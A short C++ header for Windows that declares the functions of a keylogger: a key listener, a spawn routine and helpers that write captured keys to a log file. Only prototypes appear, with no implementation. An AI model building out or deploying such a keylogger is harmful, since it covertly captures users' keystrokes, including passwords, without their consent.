#pragma once
#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

void WriteLog(string filename, const char* key);
void WriteLogChar(string filename, char key);
int keylistener(string FILENAME_LOG, int key);
int keylogger_spawn(string FILENAME_LOG);